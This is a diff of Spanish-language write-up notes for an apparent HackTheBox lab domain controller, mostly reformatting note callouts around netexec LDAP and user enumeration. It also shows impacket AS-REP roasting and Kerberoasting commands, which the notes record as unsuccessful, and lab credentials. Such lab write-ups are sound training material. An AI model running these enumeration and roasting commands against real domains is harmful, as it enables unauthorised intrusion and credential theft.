@@ -21,8 +21,10 @@ Los puertos encontrados mas relevantes son:
 Usaremos [[CRACKMAPEXEC-NETEXEC]] para enumerar información básica del servicio *LDAP*.
 `netexec ldap $IP 2>/dev/null` 
 
-```
+```js
+
 LDAP $IP 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
+
 ```
 
 Nos muestra: el protocolo `LDAP` la `IP` y el puerto `389`, a continuación nos muestra el rol del host `DC` que es *Domain Controller*, identificación del sistema operativo , nombre del host y dominio completo `FQDN`
@@ -48,7 +50,7 @@ Usaremos la opción `--shares` para listar los recursos compartidos y el modulo 
 Enumerar usuarios del dominio con [[CRACKMAPEXEC-NETEXEC]] 
 `nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`
 
-```     
+```ad-hint    
 Administrator    
 Guest            
 krbtgt           
@@ -65,12 +67,24 @@ Enumeración de usuarios y verificar que exista en el dominio con la herramienta
 
  O también podemos usar [[CRACKMAPEXEC-NETEXEC]] para enumerar usuarios
  `nxc ldap $IP -u users.txt -p '' -k`
- ```ad-
+
+ ```ad-note
+   El error KDC_ERR_PREAUTH_FAILED la contraseña no funciona pero existe el usuario
+  El error KDC_ERR_CLIENT_REVOKED existe el usuario
  ```
-  El error `KDC_ERR_PREAUTH_FAILED` la contraseña no funciona pero existe el usuario
-  El error `KDC_ERR_CLIENT_REVOKED` existe el usuario
+ 
 
 
+```ad-info
+### AS-REP ROASTING (Sin creds)
+`impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
+No es susceptible al ataque.
+
+### KERBEROASTING (Con creds validas)
+Enumeración de usuario que tenga serviceprincipalname (SPN) 
+`impacket-GetUserSPNs 'puppy.htb/levi.james:KingofAkron2025!' -dc-ip $IP`
+No es susceptible al ataque.  
+```
 ### AS-REP ROASTING (Sin creds)
 `impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
 No es susceptible al ataque. 
